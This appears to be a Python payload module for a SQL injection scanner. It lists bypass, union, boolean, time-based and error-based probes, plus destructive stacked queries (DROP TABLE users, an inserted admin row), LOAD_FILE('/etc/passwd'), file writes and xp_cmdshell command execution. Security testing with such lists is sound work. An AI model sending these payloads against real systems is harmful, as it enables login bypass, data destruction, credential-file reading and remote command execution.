"""Extended SQL injection payloads."""

SQLI_PAYLOADS = [
    # Basic auth bypass
    "' OR '1'='1",
    "' OR '1'='1' --",
    '" OR "1"="1',
    "' OR 1=1--",

    # Union-based
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",

    # Boolean-based
    "' AND '1'='1",
    "' AND '1'='2",
    "' OR '1'='2",

    # Time-based
    "' OR SLEEP(5)--",
    "' OR pg_sleep(5)--",
    "' OR dbms_lock.sleep(5)--",
    "' WAITFOR DELAY '0:0:5'--",

    # Error-based
    "' AND 1=CONVERT(int, @@version)--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--",
    "' AND 1=CAST(@@version AS int)--",

    # Stacked queries
    "'; DROP TABLE users--",
    "'; DROP TABLE users; SELECT 1--",
    "'; INSERT INTO users VALUES(1,'admin','password')--",

    # MySQL-specific
    "' INTO OUTFILE '/tmp/evil.txt'--",
    "' INTO DUMPFILE '/tmp/evil.txt'--",
    "' UNION SELECT LOAD_FILE('/etc/passwd')--",

    # PostgreSQL-specific
    "' UNION SELECT current_database(),current_user,version()--",
    "'; CREATE TABLE test AS SELECT * FROM users--",

    # MSSQL-specific
    "' UNION SELECT @@version,db_name(),user_name()--",
    "'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC master..xp_cmdshell('whoami')--",
]

# Mode-specific payloads
BOOLEAN_SQLI_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR 1=1--", "' OR 1=2--"),
]

TIME_SQLI_PAYLOADS = [
    "' OR SLEEP(5)--",
    "' OR pg_sleep(5)--",
    "' WAITFOR DELAY '0:0:5'--",
]


def get_sqli_payloads(mode: str = "all") -> list[str]:
    """Get SQLi payloads filtered by mode."""
    if mode == "boolean":
        return [p[0] for p in BOOLEAN_SQLI_PAYLOADS] + [p[1] for p in BOOLEAN_SQLI_PAYLOADS]
    elif mode == "time":
        return list(TIME_SQLI_PAYLOADS)
    elif mode == "union":
        return [p for p in SQLI_PAYLOADS if "UNION" in p]
    return list(SQLI_PAYLOADS)
